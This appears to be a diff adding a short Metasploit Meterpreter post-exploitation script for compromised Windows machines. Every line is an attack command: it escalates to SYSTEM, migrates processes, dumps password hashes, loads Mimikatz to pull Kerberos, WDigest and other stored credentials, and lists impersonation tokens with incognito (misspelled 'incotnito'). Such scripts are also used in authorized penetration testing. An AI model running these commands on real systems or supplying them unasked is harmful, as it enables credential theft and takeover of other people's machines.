@@ -1,0 +1,21 @@
+##############################
+#Post Exploit standard
+##############################
+sysinfo
+getsystem
+run post/windows/manage/smart_migrate
+run post/windows/gather/hashdump
+
+#Mimikatz
+load mimikatz
+kerberos
+livessp
+msv
+ssp
+tspkg
+wdigest
+
+#incognito
+use incotnito
+list_tokens -u
+
